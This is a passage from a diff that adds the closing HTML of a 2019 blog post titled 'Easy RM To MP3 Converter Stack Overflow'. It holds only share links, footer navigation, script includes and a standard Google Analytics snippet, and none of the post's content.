+  <li><a class="icon" href="http://digg.com/submit?url=http://liangyuewei.com/2019/11/16/Easy RM To MP3 Converter Stack Overflow/&title=Easy RM To MP3 Converter Stack Overflow"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://liangyuewei.com/2019/11/16/Easy RM To MP3 Converter Stack Overflow/&name=Easy RM To MP3 Converter Stack Overflow&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 Yuewei.Liang
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-86660611-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
